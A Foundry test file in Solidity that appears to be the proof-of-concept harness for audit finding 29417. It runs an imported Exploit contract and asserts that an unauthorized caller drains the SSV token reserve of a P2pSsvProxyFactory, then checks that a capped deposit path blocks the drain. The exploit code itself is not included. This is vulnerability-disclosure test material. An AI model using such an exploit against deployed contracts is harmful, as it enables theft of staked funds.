// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, P2pSsvProxyFactory, SsvToken, DepositContract} from
    "./29417-depositethandregistervalidators-allows-unauthorized-users-to.sol";

contract Finding29417Test is Test {
    function test_caller_drains_the_ssv_reserve() public {
        Exploit e = new Exploit();
        vm.deal(address(this), 32 ether);
        e.run{value: 32 ether}();
        assertEq(e.drained(), 1_000_000, "drained");
        assertEq(e.factoryLeft(), 0, "factory");
        assertEq(e.ethReturned(), 32 ether, "eth back");
        console2.log("ssv drained", e.drained());
        console2.log("factory left", e.factoryLeft());
        console2.log("eth returned", e.ethReturned());
    }

    function test_control_cap_keeps_999000_ssv() public {
        SsvToken ssv = new SsvToken();
        DepositContract beacon = new DepositContract();
        P2pSsvProxyFactory factory = new P2pSsvProxyFactory(ssv, beacon, address(0x0B0), 1);
        ssv.mint(address(factory), 1_000_000);

        P2pSsvProxyFactory.SsvOperator[] memory ops = new P2pSsvProxyFactory.SsvOperator[](1);
        ops[0] = P2pSsvProxyFactory.SsvOperator({owner: address(0x0B0), id: 1});
        P2pSsvProxyFactory.SsvPayload memory huge =
            P2pSsvProxyFactory.SsvPayload({ssvOperators: ops, tokenAmount: 1_000_000});
        vm.deal(address(this), 64 ether);
        vm.expectRevert(
            abi.encodeWithSelector(
                P2pSsvProxyFactory.P2pSsvProxyFactory__TokenAmountTooHigh.selector, 1_000_000, 1000
            )
        );
        factory.depositCapped{value: 32 ether}(address(this), huge);

        P2pSsvProxyFactory.SsvPayload memory capped =
            P2pSsvProxyFactory.SsvPayload({ssvOperators: ops, tokenAmount: 1000});
        factory.depositCapped{value: 32 ether}(address(this), capped);
        assertEq(ssv.balanceOf(address(factory)), 999_000, "left");
        console2.log("control factory ssv", ssv.balanceOf(address(factory)));
    }
}
